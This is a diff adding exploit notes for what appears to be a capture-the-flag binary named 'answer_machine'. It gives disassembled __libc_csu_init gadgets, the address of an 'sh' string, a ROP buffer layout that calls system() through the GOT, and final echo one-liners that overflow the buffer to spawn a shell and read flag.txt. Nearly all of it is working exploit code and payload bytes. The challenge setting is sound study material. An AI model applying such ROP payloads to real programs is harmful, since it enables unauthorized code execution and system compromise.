@@ -1,0 +1,39 @@
+Load registers and jump
+--------------------------------------------------------------------
+4008e6:       44 89 ff                mov    %r15d,%edi
+4008e9:       41 ff 14 dc             callq  *(%r12,%rbx,8)
+4008ed:       48 83 c3 01             add    $0x1,%rbx
+4008f1:       48 39 eb                cmp    %rbp,%rbx
+4008f4:       75 ea                   jne    4008e0 <__libc_csu_init+0x40>
+4008f6:       48 83 c4 08             add    $0x8,%rsp
+4008fa:       5b                      pop    %rbx
+4008fb:       5d                      pop    %rbp
+4008fc:       41 5c                   pop    %r12
+4008fe:       41 5d                   pop    %r13
+400900:       41 5e                   pop    %r14
+400902:       41 5f                   pop    %r15
+400904:       c3                      retq
+
+"sh"
+--------------------------------------------------------------------
+0x400980 - "Error opening file; message moved to trash\n"
+0x4009a8 - "sh\n"
+
+ROP buffer
+--------------------------------------------------------------------
+-0xYY: Overflow junk (0xYY bytes)
+ 0x00: Register pop gadget (0x4008fa)
+ 0x08: RBX (0x0)
+ 0x10: RBP
+ 0x18: R12 (0x601028 - address of system() in GOT)
+ 0x30: R15 (0x4009a8 - address of "sh\n")
+ 0x38: Set EDI and call gadget (0x4008e6)
+
+Tests
+--------------------------------------------------------------------
+ROP to system("/bin/date"):
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCC\xcf\x07\x40\x00\x00\x00\x00\x00"; sleep 1; } | ./answer_machine
+
+Final
+--------------------------------------------------------------------
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCC\xfa\x08\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00EEEEEEEE\x28\x10\x60\x00\x00\x00\x00\x00FFFFFFFFGGGGGGGG\xa8\x09\x40\x00\x00\x00\x00\x00\xe6\x08\x40\x00\x00\x00\x00\x00"; sleep 1; echo "cat flag.txt"; } | ./answer_machine
